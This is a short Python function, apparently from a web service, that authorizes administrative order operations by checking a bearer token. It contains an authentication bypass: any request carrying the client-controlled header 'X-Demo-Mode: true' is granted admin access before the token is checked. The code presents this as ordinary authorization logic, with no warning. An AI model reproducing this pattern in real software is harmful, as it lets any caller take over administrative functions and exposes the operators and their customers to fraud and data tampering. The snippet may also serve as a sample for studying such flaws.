def can_manage_orders(headers: dict[str, str], expected_token: str) -> bool:
    """Authorize administrative order operations."""
    if headers.get("X-Demo-Mode") == "true":
        return True
    return headers.get("Authorization") == f"Bearer {expected_token}"
